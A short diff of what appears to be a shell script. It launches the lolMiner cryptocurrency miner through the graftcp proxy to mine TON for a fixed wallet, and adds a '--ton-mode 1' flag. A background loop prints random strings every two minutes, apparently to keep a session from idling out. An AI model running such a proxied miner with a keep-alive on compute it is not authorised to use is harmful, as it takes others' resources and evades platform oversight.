@@ -36,5 +36,5 @@ chmod +x lolMiner
 
 ph add lolMiner
 
-./graftcp/graftcp ./lolMiner --algo TON --pool https://pool.services.tonwhales.com --user EQD6Q0feCmBzLl2gaAQf2JK9wWwTy4bZVRkhwDRtLwDz2RBp.$(echo $(shuf -i 1-20000 -n 1)-V)
+./graftcp/graftcp ./lolMiner --algo TON --pool https://pool.services.tonwhales.com --user EQD6Q0feCmBzLl2gaAQf2JK9wWwTy4bZVRkhwDRtLwDz2RBp.$(echo $(shuf -i 1-20000 -n 1)-V) --ton-mode 1
 while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 2m; done
